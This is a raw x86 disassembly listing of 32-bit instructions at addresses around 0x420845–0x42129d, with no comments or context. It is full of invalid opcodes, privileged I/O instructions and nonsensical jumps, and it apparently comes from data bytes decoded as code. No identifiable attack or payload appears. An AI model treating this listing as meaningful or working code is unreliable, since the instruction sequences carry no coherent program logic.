  420845:	jo     0x42085b
  420847:	xchg   esp,eax
  420848:	xchg   BYTE PTR [eax],dl
  42084a:	js     0x4208a3
  42084c:	mov    bh,BYTE PTR [edx+edx*2+0x2a5811cc]
  420853:	scas   al,BYTE PTR es:[edi]
  420854:	sbb    BYTE PTR [ecx+edi*1+0x78],ah
  420858:	push   es
  420859:	sbb    al,0xaf
  42085b:	xor    BYTE PTR [ebx-0x267ad1dc],0xd3
  420862:	jl     0x420862
  420864:	xchg   esp,eax
  420865:	jbe    0x4208c3
  420867:	pop    esi
  420868:	cmp    al,0x4b
  42086a:	repnz idiv DWORD PTR [eax-0x26]
  42086e:	inc    edi
  42086f:	gs sub dl,dl
  420872:	popf   
  420873:	hlt    
  420874:	imul   edx,DWORD PTR [esi+esi*8+0x40804c53],0xffffffe6
  42087c:	cs pop eax
  42087e:	jmp    0x45c32ade
  420883:	and    BYTE PTR [ecx-0x316d555d],cl
  420889:	cmp    edi,ebp
  42088b:	push   ecx
  42088c:	pop    edi
  42088d:	push   ds
  42088e:	inc    ebp
  42088f:	pop    ebp
  420890:	xor    dh,BYTE PTR [edi]
  420892:	in     al,dx
  420893:	pop    edx
  420894:	scas   eax,DWORD PTR es:[edi]
  420895:	bnd jge 0x420825
  420898:	pop    ss
  420899:	sbb    al,BYTE PTR [ebp+0x53da5ee4]
  42089f:	jae    0x420897
  4208a1:	cwde   
  4208a2:	mov    edi,0x3694f8cb
  4208a7:	call   0x57c8:0xa7fdbd95
  4208ae:	int3   
  4208af:	adc    eax,0xe1073f12
  4208b4:	sbb    BYTE PTR [ecx],cl
  4208b6:	sar    DWORD PTR [eax+0x698d0b17],1
  4208bc:	add    al,0xcd
  4208be:	in     al,dx
  4208bf:	sbb    bl,BYTE PTR [ebx]
  4208c1:	popf   
  4208c2:	dec    ecx
  4208c3:	xor    esi,esp
  4208c5:	jo     0x420880
  4208c7:	in     al,0x5d
  4208c9:	and    BYTE PTR [edx+ebx*8-0x48],cl
  4208cd:	sbb    BYTE PTR cs:[ecx-0x77548b3a],0x38
  4208d5:	pop    esp
  4208d6:	in     eax,dx
  4208d7:	addr16 mov al,0x2b
  4208da:	xchg   edi,eax
  4208db:	push   ecx
  4208dc:	ret    0xe94f
  4208df:	ret    
  4208e0:	and    esp,DWORD PTR [edi]
  4208e2:	or     eax,0x1234c131
  4208e7:	adc    DWORD PTR [eax+0x51dca140],ecx
  4208ed:	push   es
  4208ee:	and    BYTE PTR [ebp+0x337086ec],dh
  4208f4:	adc    bh,ah
  4208f6:	icebp  
  4208f7:	inc    ecx
  4208f8:	xor    al,0xa4
  4208fa:	xchg   BYTE PTR [eax-0x23],cl
  4208fd:	inc    ecx
  4208fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208ff:	lock fbld TBYTE PTR [ebp+0x29]
  420903:	or     eax,0x257e8867
  420908:	popa   
  420909:	jo     0x420968
  42090b:	or     eax,0x8a826505
	...
  420974:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0x49
  420981:	lock dec ebx
  420983:	out    0xf8,eax
  420985:	pop    edx
  420986:	add    DWORD PTR [eax],eax
  420988:	add    al,0x1
  42098a:	add    BYTE PTR [eax],al
  42098c:	adc    DWORD PTR [esi],eax
  42098e:	adc    eax,0xa0dcd5e8
  420993:	push   edi
  420994:	dec    ebx
  420995:	xor    bh,cl
  420997:	cmp    dl,0xc5
  42099a:	jg     0x420965
  42099c:	sbb    DWORD PTR ds:0xef0cab6b,0xafc4d74b
  4209a6:	inc    esi
  4209a7:	scas   eax,DWORD PTR es:[edi]
  4209a8:	mov    al,ds:0x5bedfe2b
  4209ad:	push   0x3f96a81c
  4209b2:	jle    0x4209bf
  4209b4:	inc    esi
  4209b5:	fcomp  QWORD PTR [edi+0x4bbc6013]
  4209bb:	dec    edi
  4209bc:	jae    0x420a39
  4209be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209bf:	ins    BYTE PTR es:[edi],dx
  4209c0:	or     BYTE PTR [esi],cl
  4209c2:	(bad)  
  4209c3:	inc    eax
  4209c4:	imul   esi,edx,0x69
  4209c7:	imul   ebp
  4209c9:	rol    DWORD PTR [esi-0x4d],cl
  4209cc:	xor    DWORD PTR [ebx-0x60fa566e],0xe5a8b553
  4209d6:	addr16 xchg ecx,eax
  4209d8:	sub    edi,DWORD PTR [edi+0x5f]
  4209db:	mov    al,0xac
  4209dd:	jb     0x420a4b
  4209df:	sti    
  4209e0:	add    al,0xc
  4209e2:	jmp    0x887b4aa3
  4209e7:	inc    esi
  4209e8:	idiv   DWORD PTR [ebp-0x1b]
  4209eb:	fwait
  4209ec:	in     eax,dx
  4209ed:	stos   DWORD PTR es:[edi],eax
  4209ee:	or     eax,0xe7d3ce7
  4209f3:	hlt    
  4209f4:	add    edi,ecx
  4209f6:	push   ebp
  4209f7:	dec    edx
  4209f8:	inc    edi
  4209f9:	sub    eax,0x8dbd07f1
  4209fe:	out    0x64,eax
  420a00:	sbb    eax,0x52a45782
  420a05:	in     al,0x6f
  420a07:	aad    0xd8
  420a09:	sbb    al,bh
  420a0b:	shl    DWORD PTR [ecx],1
  420a0d:	fcmovnb st,st(6)
  420a0f:	outs   dx,BYTE PTR ds:[esi]
  420a10:	cmp    al,0x35
  420a12:	je     0x420a4b
  420a14:	add    eax,0x1e0c7b74
  420a19:	mov    ecx,0x49893b6e
  420a1e:	mov    esp,0xf23cc13c
  420a23:	retf   0xf984
  420a26:	stos   BYTE PTR es:[edi],al
  420a27:	sbb    DWORD PTR [ebx],eax
  420a29:	cmp    eax,0xd749d5e1
  420a2e:	inc    ebx
  420a2f:	pop    ecx
  420a30:	inc    ebp
  420a31:	loopne 0x420a51
  420a33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a34:	or     DWORD PTR [esp+ebp*1],0x65
  420a38:	clc    
  420a39:	std    
  420a3a:	sub    DWORD PTR [ecx],ebx
  420a3c:	pandn  mm3,mm0
  420a3f:	dec    ecx
  420a40:	sub    esp,eax
  420a42:	stos   DWORD PTR es:[edi],eax
  420a43:	(bad)  
  420a44:	in     eax,dx
  420a45:	frstor [edx+0x2e]
  420a48:	xor    ch,bh
  420a4a:	jno    0x4209d5
  420a4c:	push   ss
  420a4d:	(bad)  [edi+eiz*1-0x1d271507]
  420a54:	sub    al,0xc4
  420a56:	pop    ebx
  420a57:	out    0xd7,eax
  420a59:	cmp    al,0x77
  420a5b:	ja     0x420aba
  420a5d:	fidiv  WORD PTR [edi-0x579cf5b]
  420a63:	xchg   DWORD PTR [edi],ecx
  420a65:	sub    DWORD PTR [ebx-0x52816830],edx
  420a6b:	mov    ah,0xd5
  420a6d:	cmp    ch,al
  420a6f:	pop    esi
  420a70:	js     0x420a33
  420a72:	das    
  420a73:	pusha  
  420a74:	push   cs
  420a75:	stos   BYTE PTR es:[edi],al
  420a76:	or     eax,0xcbb4b154
  420a7b:	scas   al,BYTE PTR es:[edi]
  420a7c:	test   BYTE PTR [ebx+0xb],0xd4
  420a80:	adc    ch,BYTE PTR [ebx+0x84e3780]
  420a86:	sub    eax,0x84ac8633
  420a8b:	or     esp,esi
  420a8d:	dec    ebp
  420a8e:	mov    eax,ds:0x89
	...
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	ret    0x6bec
  420b03:	nop
  420b04:	cld    
  420b05:	pop    ebx
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    al,0x1
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	push   es
  420b0d:	gs sbb eax,0x3213664c
  420b13:	xchg   edx,eax
  420b14:	adc    BYTE PTR [ebp+0x7c],dh
  420b17:	push   es
  420b18:	xor    al,0x68
  420b1a:	sub    al,0x6
  420b1c:	ficom  DWORD PTR [edx+0x3b]
  420b1f:	push   edx
  420b20:	clc    
  420b21:	or     al,0x37
  420b23:	xor    al,0x28
  420b25:	mov    ds:0xe4bd66d4,al
  420b2a:	push   edi
  420b2b:	or     cl,BYTE PTR ds:0x199ff222
  420b31:	shl    BYTE PTR cs:[eax],1
  420b34:	push   ecx
  420b35:	lahf   
  420b36:	xchg   esp,eax
  420b37:	fst    QWORD PTR [edx+0x73]
  420b3a:	cmc    
  420b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b3c:	mov    bl,0xf3
  420b3e:	cmp    DWORD PTR [edx],ebp
  420b40:	gs inc esp
  420b42:	cmc    
  420b43:	pop    edi
  420b44:	les    ecx,FWORD PTR [ebp-0xa1032fe]
  420b4a:	loop   0x420b06
  420b4c:	jnp    0x420b51
  420b4e:	cmp    bh,BYTE PTR [edx+0x4dc8ed2c]
  420b54:	enter  0xfe7d,0x3b
  420b58:	rcr    DWORD PTR [ecx+0x50],0x9c
  420b5c:	inc    ebx
  420b5d:	jle    0x420b60
  420b5f:	sti    
  420b60:	scas   eax,DWORD PTR es:[edi]
  420b61:	fcom   DWORD PTR [esi-0x9cdaaea]
  420b67:	pop    ebp
  420b68:	jmp    0x327b8976
  420b6d:	call   0x1ef2:0x491ea763
  420b74:	std    
  420b75:	mov    ch,0x71
  420b78:	lea    esp,[esi-0x36]
  420b7b:	jns    0x420b02
  420b7d:	stos   DWORD PTR es:[edi],eax
  420b7e:	adc    eax,0xc33d8a29
  420b83:	inc    esi
  420b84:	jne    0x420b9f
  420b86:	pusha  
  420b87:	nop
  420b88:	mov    edi,0x2caf3d01
  420b8d:	scas   eax,DWORD PTR es:[edi]
  420b8e:	pop    ecx
  420b8f:	jg     0x420b21
  420b91:	cmp    ebp,edi
  420b93:	sub    DWORD PTR [edx+0x41],esi
  420b96:	and    BYTE PTR [eax+edi*1-0x2d],ah
  420b9a:	jge    0x420bbc
  420b9c:	dec    edx
  420b9d:	lea    ebx,[ebx]
  420b9f:	mov    edi,0x46ffa38c
  420ba4:	add    bh,bl
  420ba6:	xor    eax,0x25a4e0ab
  420bab:	aas    
  420bac:	pushf  
  420bad:	mov    ds:0x75399351,al
  420bb2:	pop    ebp
  420bb3:	or     eax,0x403de937
  420bb8:	loopne 0x420be5
  420bba:	scas   al,BYTE PTR es:[edi]
  420bbb:	push   0x26
  420bbd:	sub    edx,DWORD PTR [ebx]
  420bbf:	xlat   BYTE PTR ds:[ebx]
  420bc0:	or     al,0x8c
  420bc2:	xor    bl,ch
  420bc4:	pushf  
  420bc5:	adc    al,0xdc
  420bc7:	cmp    eax,0x7b50b942
  420bcc:	cs (bad) 
  420bcf:	popa   
  420bd0:	int    0x9c
  420bd2:	or     eax,0x134aa730
  420bd7:	ror    al,cl
  420bd9:	mov    esi,0xbf5d0466
  420bde:	adc    BYTE PTR [ecx],dh
  420be0:	rcl    DWORD PTR [ebx],cl
  420be2:	pop    ebp
  420be3:	aaa    
  420be4:	mov    ds:0xf69883c3,al
  420be9:	or     edi,DWORD PTR [edx-0x2ddd084c]
  420bef:	push   eax
  420bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bf1:	dec    edi
  420bf2:	nop
  420bf3:	pop    ss
  420bf4:	test   eax,0x7806211c
  420bf9:	popa   
  420bfa:	jp     0x420c42
  420bfc:	push   ss
  420bfd:	adc    bh,bh
  420bff:	pop    eax
  420c00:	shl    BYTE PTR [esi],0x4d
  420c03:	cld    
  420c04:	sub    DWORD PTR [edi+0x603c615b],0xdb3226d7
  420c0e:	push   cs
  420c0f:	data16 add BYTE PTR [eax],al
	...
  420c72:	add    BYTE PTR [eax],al
  420c74:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c7a:	mov    edx,0x1886e3f
  420c7f:	in     eax,0xf
  420c81:	sub    edi,DWORD PTR [edx]
  420c83:	mov    cl,0x0
  420c85:	pop    ebp
  420c86:	add    DWORD PTR [eax],eax
  420c88:	add    al,0x1
  420c8a:	add    BYTE PTR [eax],al
  420c8c:	sar    esi,cl
  420c8e:	jbe    0x420cd5
  420c90:	push   ss
  420c91:	xor    DWORD PTR [ebx-0x5c],esi
  420c94:	mov    ch,0x17
  420c96:	sub    eax,0x622a8b24
  420c9b:	test   DWORD PTR [esi],esi
  420c9d:	inc    edi
  420c9e:	fidivr DWORD PTR [eax-0x80]
  420ca1:	xor    bh,ah
  420ca3:	sub    ah,ch
  420ca5:	xchg   ebp,eax
  420ca6:	fsubr  QWORD PTR [esi+0x211ab22d]
  420cac:	adc    DWORD PTR [esi],ebp
  420cae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420caf:	sbb    al,0xeb
  420cb1:	mov    eax,ds:0x129f9cd8
  420cb6:	cmp    eax,0x6cfbac22
  420cbb:	add    dh,BYTE PTR [eax+edx*2+0x61]
  420cbf:	shl    DWORD PTR [ebp*1+0x1e49c757],cl
  420cc6:	in     al,0xca
  420cc8:	imul   esp,DWORD PTR [eax-0x4a],0x22
  420ccc:	mov    cl,0x95
  420cce:	jl     0x420d05
  420cd0:	dec    ebp
  420cd1:	imul   edi,DWORD PTR [esi+0x28],0x48
  420cd5:	fstp   TBYTE PTR [eax]
  420cd7:	mov    eax,0xe477a5e9
  420cdc:	dec    edi
  420cdd:	and    edx,ecx
  420cdf:	out    0xb4,eax
  420ce1:	or     eax,0xb5574082
  420ce6:	(bad)  [esi]
  420ce8:	mov    BYTE PTR [ecx],bh
  420cea:	and    dh,BYTE PTR [edi-0x27f6caf4]
  420cf0:	cdq    
  420cf1:	xor    BYTE PTR [edi],al
  420cf3:	pop    esi
  420cf4:	dec    esp
  420cf5:	fs das 
  420cf7:	data16 add al,0xd8
  420cfa:	shl    DWORD PTR [edi+edi*8-0xf],1
  420cfe:	cli    
  420cff:	cld    
  420d00:	lds    esp,FWORD PTR [ebp-0x16b1ad6f]
  420d06:	dec    esi
  420d07:	pop    edx
  420d08:	cdq    
  420d09:	in     al,dx
  420d0a:	xor    DWORD PTR [edx-0x15],0xffffffc7
  420d0e:	inc    ebx
  420d0f:	mov    ah,0x62
  420d11:	stos   DWORD PTR es:[edi],eax
  420d12:	test   DWORD PTR [edi],0x23bbeeb0
  420d18:	cs push eax
  420d1a:	mov    bh,0xd1
  420d1c:	rcr    BYTE PTR [ebp-0x3590ea40],0x59
  420d23:	shr    DWORD PTR [ecx-0x37],0x8
  420d27:	addr16 push 0xffffffa1
  420d2a:	sub    eax,0x7d721519
  420d2f:	pop    ss
  420d30:	stos   DWORD PTR es:[edi],eax
  420d31:	adc    DWORD PTR [edi-0x25],esp
  420d34:	loope  0x420ce9
  420d36:	lock jg 0x420d15
  420d39:	in     eax,dx
  420d3a:	je     0x420d3a
  420d3c:	dec    esi
  420d3d:	jb     0x420cf0
  420d3f:	and    DWORD PTR [ecx+edi*8+0x19a8f95d],0xa0550033
  420d4a:	es dec esp
  420d4c:	xchg   edi,eax
  420d4d:	rcl    eax,cl
  420d4f:	daa    
  420d50:	(bad)  
  420d51:	mov    ds:0xed8b4a6e,eax
  420d56:	inc    esi
  420d57:	in     al,dx
  420d58:	xchg   edi,eax
  420d59:	(bad)  
  420d5a:	(bad)  
  420d5b:	xchg   esp,eax
  420d5c:	out    dx,al
  420d5d:	mov    al,BYTE PTR [esi-0x696dfc2b]
  420d63:	retf   
  420d64:	clc    
  420d65:	mov    cs,edi
  420d67:	ror    esp,cl
  420d69:	push   edx
  420d6a:	out    dx,al
  420d6b:	fldcw  WORD PTR [ebp+0x4]
  420d6e:	cmp    eax,0x914c6e03
  420d73:	cli    
  420d74:	outs   dx,BYTE PTR ds:[esi]
  420d75:	jp     0x420d17
  420d77:	into   
  420d78:	push   0x1e
  420d7a:	loopne 0x420d6d
  420d7c:	mov    esi,0x1670b5f1
  420d81:	or     eax,0x7a99d32d
  420d86:	mov    ebp,DWORD PTR [esi+0x54c17635]
  420d8c:	clc    
  420d8d:	jmp    0x0:0xe5a5
	...
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0x97f05228
  420e04:	add    al,0x5e
  420e06:	add    DWORD PTR [eax],eax
  420e08:	add    al,0x1
  420e0a:	add    BYTE PTR [eax],al
  420e0c:	jg     0x420dd2
  420e0e:	push   esi
  420e0f:	adc    edx,DWORD PTR [edx-0x8]
  420e12:	nop
  420e13:	or     DWORD PTR [esi-0x29],esi
  420e16:	pop    eax
  420e17:	test   DWORD PTR [ebp-0x2186fe29],0xa9641974
  420e21:	test   DWORD PTR [ebp-0x55],esp
  420e24:	mov    eax,0x48a165d5
  420e29:	push   0x14e63c74
  420e2e:	sbb    DWORD PTR [ecx],esp
  420e30:	mov    ch,0xa9
  420e32:	add    DWORD PTR [edi+ecx*1+0x271b9016],eax
  420e39:	divps  xmm7,XMMWORD PTR [ebx]
  420e3c:	test   DWORD PTR [esi-0x453f1bb9],edx
  420e42:	pop    esp
  420e43:	dec    esp
  420e44:	xor    BYTE PTR [esi+0x72],0x1
  420e48:	aas    
  420e49:	and    DWORD PTR [eax+0x77],esp
  420e4c:	cmp    ebx,DWORD PTR [ecx+0x151651f2]
  420e52:	into   
  420e53:	test   BYTE PTR [ebx],bl
  420e55:	hlt    
  420e56:	jo     0x420de2
  420e58:	jb     0x420e10
  420e5a:	scas   al,BYTE PTR es:[edi]
  420e5b:	mov    ds,WORD PTR [ebx]
  420e5d:	packuswb mm1,QWORD PTR [esi-0x31bcc3f9]
  420e64:	pop    ss
  420e65:	mov    DWORD PTR [ebx+eiz*4+0x1757aff0],0x4cd7fcf0
  420e70:	pop    edx
  420e71:	mov    ah,0x2
  420e73:	or     BYTE PTR [edx],bh
  420e75:	les    edx,FWORD PTR [edi]
  420e77:	jb     0x420ed8
  420e79:	(bad)  
  420e7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e7b:	loop   0x420ebc
  420e7d:	cdq    
  420e7e:	or     DWORD PTR [ebx+0x19],edx
  420e81:	or     BYTE PTR [edx],0x95
  420e84:	fdiv   QWORD PTR [esi+0x5f]
  420e87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e88:	pop    esp
  420e89:	call   WORD PTR [edi]
  420e8c:	cdq    
  420e8d:	inc    esp
  420e8e:	imul   esi,ebx,0x36
  420e91:	in     eax,0xa9
  420e93:	ret    0xa136
  420e96:	lods   al,BYTE PTR ds:[esi]
  420e97:	pop    ebp
  420e98:	inc    ebp
  420e99:	test   BYTE PTR [esi],bh
  420e9b:	lods   al,BYTE PTR ds:[esi]
  420e9c:	daa    
  420e9d:	xchg   edi,eax
  420e9e:	cmp    DWORD PTR [eax],0x1dad55ab
  420ea4:	jns    0x420ebb
  420ea6:	lock or cl,bh
  420ea9:	pop    edx
  420eaa:	sbb    al,0x68
  420eac:	popf   
  420ead:	icebp  
  420eae:	stos   BYTE PTR es:[edi],al
  420eaf:	add    BYTE PTR [ebp+0x21851e5e],ah
  420eb5:	bnd jne 0x420e93
  420eb8:	call   0xdc4ef347
  420ebd:	add    BYTE PTR [ebx-0x74142fc2],bh
  420ec3:	xor    al,0x1c
  420ec5:	push   ebx
  420ec6:	std    
  420ec7:	mov    fs,ecx
  420ec9:	mov    dh,0x86
  420ecb:	add    eax,0xc06f1d28
  420ed0:	scas   al,BYTE PTR es:[edi]
  420ed1:	push   ebp
  420ed2:	push   ebx
  420ed3:	shl    DWORD PTR [esi+0xab8b866],1
  420ed9:	imul   edx,DWORD PTR [edx+0xd],0x1be2bd73
  420ee0:	add    edx,ebx
  420ee2:	cmp    BYTE PTR [ebx+0x31f77e61],dl
  420ee8:	xor    al,0xcd
  420eea:	inc    ecx
  420eeb:	dec    ah
  420eed:	outs   dx,DWORD PTR ds:[esi]
  420eee:	cmp    DWORD PTR [edi-0x6b],ebx
  420ef1:	(bad)  
  420ef3:	stos   BYTE PTR es:[edi],al
  420ef4:	xor    edi,DWORD PTR [eax+0x39]
  420ef7:	cmc    
  420ef8:	mov    bl,0x77
  420efa:	pushf  
  420efb:	loopne 0x420f23
  420efd:	out    0xf9,eax
  420eff:	pop    esi
  420f00:	jp     0x420edf
  420f02:	lds    ecx,FWORD PTR [edi]
  420f04:	xor    BYTE PTR [esi],al
  420f06:	mov    ebp,0xdcc59d49
  420f0b:	je     0x420ed8
  420f0d:	sbb    BYTE PTR [eax+0x89],bh
	...
  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0xf62779e]
  420f84:	or     BYTE PTR [edi+0x1],bl
  420f87:	add    BYTE PTR [ecx+eax*1],al
  420f8a:	add    BYTE PTR [eax],al
  420f8c:	stos   DWORD PTR es:[edi],eax
  420f8d:	inc    edx
  420f8e:	mov    bh,0x1c
  420f90:	lock aas 
  420f92:	lahf   
  420f93:	or     DWORD PTR [ecx+0x36],edx
  420f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f97:	pop    edx
  420f98:	inc    esi
  420f99:	ret    
  420f9a:	in     al,0xbd
  420f9c:	cld    
  420f9d:	(bad)  
  420f9e:	js     0x420f8f
  420fa0:	call   0x3f2313b4
  420fa5:	loop   0x420f4f
  420fa7:	rol    BYTE PTR [ecx+0x49e601cc],cl
  420fad:	sbb    BYTE PTR [ebx+0x36f82a23],bh
  420fb3:	add    BYTE PTR [edi+ebp*2+0x6a],bl
  420fb7:	pop    ss
  420fb8:	inc    edi
  420fb9:	retf   0x2a60
  420fbc:	push   ecx
  420fbd:	cdq    
  420fbe:	and    ah,BYTE PTR [eax-0x36]
  420fc1:	enter  0x19b6,0x68
  420fc5:	or     eax,0xf47dbdfb
  420fca:	cmp    BYTE PTR [ecx],0xdb
  420fcd:	(bad)  
  420fce:	out    0x28,al
  420fd0:	fs xor al,0x79
  420fd3:	ret    0x461b
  420fd6:	test   al,0x55
  420fd8:	jae    0x421000
  420fda:	pop    edi
  420fdb:	mov    DWORD PTR [ebp+0xd184773],ebp
  420fe1:	mov    esp,DWORD PTR [eax-0x7c5d8c8]
  420fe7:	and    BYTE PTR [edi],ch
  420fe9:	adc    DWORD PTR [ecx+0x58],esi
  420fec:	rol    DWORD PTR [ebx-0x9],0x12
  420ff0:	and    dh,BYTE PTR [ecx-0xa]
  420ff3:	clc    
  420ff4:	std    
  420ff5:	cmp    DWORD PTR [esi-0x2c],0xffffffb7
  420ff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ffa:	lods   al,BYTE PTR ds:[esi]
  420ffb:	xchg   esp,eax
  420ffc:	push   0x10
  420ffe:	xchg   ebp,eax
  420fff:	mov    dh,0xbf
  421001:	cmp    eax,0xb787fdab
  421006:	or     DWORD PTR [edx],ebx
  421008:	in     eax,dx
  421009:	jp     0x421039
  42100b:	pop    esi
  42100c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42100d:	aam    0x56
  42100f:	mov    ecx,DWORD PTR [ebx+0x63]
  421012:	mov    ds:0x94aaf6ba,al
  421017:	popa   
  421018:	push   esp
  421019:	aaa    
  42101a:	xchg   edx,eax
  42101b:	xor    dh,BYTE PTR [eax+0x7152b7c3]
  421021:	into   
  421022:	inc    ebx
  421023:	push   es
  421024:	push   eax
  421025:	push   eax
  421026:	pop    edx
  421027:	jmp    0x42107e
  421029:	loopne 0x42102c
  42102b:	adc    al,0x7e
  42102d:	test   BYTE PTR [ecx+0x39],dh
  421030:	imul   edx,ebp,0x61c88fbc
  421036:	and    eax,0x4509395c
  42103b:	mov    edx,0xbf50a486
  421040:	rcr    BYTE PTR [esi-0x643efe6d],1
  421046:	mov    al,0x33
  421048:	test   eax,0xfd7aeb5e
  42104d:	mov    ds:0x9b571198,eax
  421052:	or     ecx,DWORD PTR gs:[edi]
  421055:	xor    DWORD PTR [edi-0xb597728],0x94df9cc
  42105f:	xor    eax,0x45aef1eb
  421064:	les    eax,FWORD PTR [ebp-0x7d]
  421067:	push   0xffffff94
  421069:	fisttp QWORD PTR ds:0xcf6d468e
  42106f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421070:	inc    edi
  421071:	scas   eax,DWORD PTR es:[edi]
  421072:	xchg   esi,eax
  421073:	mov    bl,BYTE PTR [ebp+0x34a30501]
  421079:	imul   ebp,esi,0x40b3392d
  42107f:	or     eax,0x1d3245e7
  421084:	pop    ecx
  421085:	call   0x6c4176c7
  42108a:	sti    
  42108b:	test   BYTE PTR [edx+0x3c],ah
  42108e:	or     DWORD PTR [eax+eax*1+0x0],0x0
	...
  4210f2:	add    BYTE PTR [eax],al
  4210f4:	lahf   
  4210f5:	pop    esi
  4210f6:	fcmovb st,st(6)
  4210f8:	fcmovnb st,st(6)
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    ?,WORD PTR [edi+0xcc660a8]
  421105:	pusha  
  421106:	add    DWORD PTR [eax],eax
  421108:	add    al,0x1
  42110a:	add    BYTE PTR [eax],al
  42110c:	dec    eax
  42110d:	test   eax,ecx
  42110f:	xchg   DWORD PTR [ebx+0x53],esp
  421112:	add    al,0xb5
  421114:	xor    dl,0x62
  421117:	sbb    dl,BYTE PTR [ecx+ecx*4+0x162ef9c2]
  42111e:	cmp    BYTE PTR [esi+ebx*1-0x1497f408],ch
  421125:	das    
  421126:	cmp    BYTE PTR [esi-0x1c7cab70],cl
  42112c:	push   eax
  42112d:	sub    DWORD PTR [edi],esi
  42112f:	or     eax,0xa3801098
  421134:	or     DWORD PTR [esi],esi
  421136:	jp     0x4210c7
  421138:	jl     0x42110e
  42113a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42113b:	stos   BYTE PTR es:[edi],al
  42113c:	push   gs
  42113e:	pop    ebp
  42113f:	hlt    
  421140:	sahf   
  421141:	mov    ebx,0x192e171e
  421146:	out    0x81,eax
  421148:	mov    ds:0x9e1d9145,al
  42114d:	jmp    0xcbc7:0xc48be58d
  421154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421155:	push   edx
  421156:	je     0x4210da
  421158:	and    eax,0x52451a3b
  42115d:	mov    bl,0xdf
  42115f:	add    dh,0x27
  421162:	xor    cl,BYTE PTR [ebp+0x19]
  421165:	mov    ah,BYTE PTR [edx]
  421167:	sub    bh,dh
  421169:	std    
  42116a:	mov    ah,dh
  42116c:	shl    DWORD PTR [esi+esi*4],0xe5
  421170:	cdq    
  421171:	(bad)
  421175:	sbb    bh,al
  421177:	push   esi
  421178:	test   eax,0x69944d75
  42117d:	retf   
  42117e:	mov    DWORD PTR [ebx],ebp
  421180:	jp     0x4211bf
  421182:	int    0x84
  421184:	add    eax,0xeec943cc
  421189:	(bad)  
  42118a:	mov    ds:0x3da3352b,eax
  42118f:	cmp    al,0x22
  421191:	jne    0x4211e8
  421193:	fwait
  421194:	pop    edx
  421195:	xor    DWORD PTR [ecx+0x35eefee3],edi
  42119b:	sbb    al,0x0
  42119d:	fnstsw WORD PTR [ecx+0x5a46bea4]
  4211a3:	or     dl,BYTE PTR [eax]
  4211a5:	add    eax,0x230cd168
  4211aa:	pop    edi
  4211ab:	push   ecx
  4211ac:	mov    dl,0x3a
  4211ae:	je     0x42119a
  4211b0:	popa   
  4211b1:	inc    edx
  4211b2:	outs   dx,DWORD PTR ds:[esi]
  4211b3:	ror    DWORD PTR [eax-0x4b],cl
  4211b6:	sbb    al,0x94
  4211b8:	lea    esp,[edi+ecx*1+0x314912df]
  4211bf:	out    0x13,al
  4211c1:	and    esi,esp
  4211c3:	fild   DWORD PTR [esi+0x55d335a]
  4211c9:	sub    DWORD PTR [edi],ecx
  4211cb:	xchg   ebp,eax
  4211cc:	sbb    BYTE PTR [ebx-0x6f],0xc9
  4211d0:	push   cs
  4211d1:	and    bh,BYTE PTR [esi+0x1d]
  4211d4:	gs cdq 
  4211d6:	in     al,0x12
  4211d8:	cli    
  4211d9:	push   ss
  4211da:	mov    esp,0x11bf331c
  4211df:	out    dx,eax
  4211e0:	cmp    al,0x8e
  4211e2:	xor    BYTE PTR [eax-0x5b],bh
  4211e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211e6:	aas    
  4211e7:	jbe    0x421229
  4211e9:	aaa    
  4211ea:	inc    ebp
  4211eb:	mov    eax,0x30791e8b
  4211f0:	sar    BYTE PTR [ebx+ebp*8-0x5fb44c48],1
  4211f7:	dec    ebp
  4211f8:	fwait
  4211f9:	repz dec eax
  4211fb:	sahf   
  4211fc:	(bad)
  421200:	sbb    DWORD PTR [esi],ecx
  421202:	dec    edi
  421203:	not    BYTE PTR [eax]
  421205:	xchg   ecx,eax
  421206:	fisttp WORD PTR [ecx+0x2f911604]
  42120c:	jmp    0xbdd39c
	...
  421271:	add    BYTE PTR [eax],al
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0xb8de7ab3
  421282:	jbe    0x4212e3
  421284:	adc    BYTE PTR [ecx+0x1],ah
  421287:	add    BYTE PTR [ecx+eax*1],al
  42128a:	add    BYTE PTR [eax],al
  42128c:	mov    ch,0x6c
  42128e:	mov    ebp,0x304b1cb2
  421293:	mov    al,ds:0x7904caca
  421298:	cmp    cl,dl
  42129a:	ret    0x4703
  42129d:	outs   dx,DWORD PTR ds:[esi]
